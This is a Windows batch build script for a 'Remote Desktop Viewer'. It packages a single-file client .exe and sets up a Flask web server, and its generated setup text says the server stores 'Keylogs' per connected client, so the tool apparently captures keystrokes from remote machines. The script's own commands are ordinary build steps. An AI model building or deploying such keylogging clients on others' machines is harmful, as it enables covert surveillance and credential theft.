@echo off
REM Build script for Windows
echo Building Remote Desktop Viewer for Windows...

REM Install dependencies
echo Installing dependencies...
pip install -r requirements.txt

REM Install PyInstaller
pip install pyinstaller

REM Build client as single file
echo Building client (single .exe file)...
pyinstaller --noconfirm client.spec
if errorlevel 1 (
    echo Client build failed!
    exit /b 1
)

REM Create server directory and copy Python files
echo Setting up server (Python scripts)...
if not exist "dist\server" mkdir dist\server
xcopy /E /I /Y server\*.py dist\server\ >nul
xcopy /E /I /Y server\templates dist\server\templates\ >nul
xcopy /E /I /Y server\static dist\server\static\ >nul
xcopy /E /I /Y common dist\server\common\ >nul
copy config.py dist\server\ >nul

REM Create server requirements.txt
echo Creating server requirements.txt...
(
echo # Server dependencies
echo Flask^>=3.0.0
echo flask-socketio^>=5.3.0
echo eventlet^>=0.33.0
echo cryptography^>=41.0.0
echo pyOpenSSL^>=24.0.0
echo Pillow^>=10.0.0
echo mss^>=9.0.0
echo numpy^>=1.24.0
echo opencv-python-headless^>=4.8.0
) > dist\server\requirements.txt

REM Fix imports in server files
powershell -Command "(Get-Content 'dist\server\server.py') -replace 'sys\.path\.insert\(0, str\(Path\(__file__\)\.parent\.parent\)\)', 'sys.path.insert(0, str(Path(__file__).parent))' | Set-Content 'dist\server\server.py'"
powershell -Command "(Get-Content 'dist\server\web_server.py') -replace 'sys\.path\.insert\(0, str\(Path\(__file__\)\.parent\.parent\)\)', 'sys.path.insert(0, str(Path(__file__).parent))' | Set-Content 'dist\server\web_server.py'"
powershell -Command "(Get-Content 'dist\server\server.py') -replace 'from server\.web_server import', 'from web_server import' | Set-Content 'dist\server\server.py'"

REM Create batch file to run server
echo @echo off > dist\server\run_server.bat
echo python server.py --web --web-port 5000 >> dist\server\run_server.bat

REM Create setup instructions
echo Creating server setup instructions...
(
echo SERVER SETUP INSTRUCTIONS
echo =========================
echo.
echo The server runs as Python scripts ^(not a single .exe file^).
echo.
echo REQUIREMENTS:
echo - Python 3.8 or higher installed
echo - Internet connection ^(for installing dependencies^)
echo.
echo SETUP STEPS:
echo 1. Open command prompt in this directory ^(dist\server^)
echo 2. Install dependencies:
echo    pip install -r requirements.txt
echo.
echo 3. Run the server:
echo    python server.py --web --web-port 5000
echo    
echo    OR double-click: run_server.bat
echo.
echo 4. Open web browser:
echo    http://localhost:5000
echo.
echo USAGE:
echo - Server listens on port 8443 for client connections ^(SSL/TLS^)
echo - Web interface runs on port 5000 ^(or custom port with --web-port^)
echo - Keylogs are saved in: keylogs/[ClientName]/
echo - Deleted clients list is saved in: server_data/deleted_clients.json
echo.
echo TROUBLESHOOTING:
echo - If you get "ModuleNotFoundError", run: pip install -r requirements.txt
echo - If port 5000 is in use, change it: python server.py --web --web-port 8000
echo - Make sure Python is in your PATH
) > dist\server\SETUP.txt

REM Copy config example
if exist "client_config.ini.example" (
    copy client_config.ini.example dist\client_config.ini.example >nul
)

echo.
echo ========================================
echo Build complete!
echo ========================================
echo.
echo CLIENT (Single File):
echo   - dist\client.exe
echo.
echo SERVER (Python - requires Python installed):
echo   - dist\server\
echo   - Run: cd dist\server ^&^& python server.py --web --web-port 5000
echo   - Or double-click: dist\server\run_server.bat
echo.
echo CONFIGURATION:
echo   - Create client_config.ini next to client.exe with:
echo     [Server]
echo     host = YOUR_SERVER_IP
echo     port = 8443
echo.
echo USAGE:
echo   Server: cd dist\server ^&^& python server.py --web --web-port 5000
echo   Client: dist\client.exe --server-host SERVER_IP --server-port 8443
echo   Web UI: http://localhost:5000
echo.
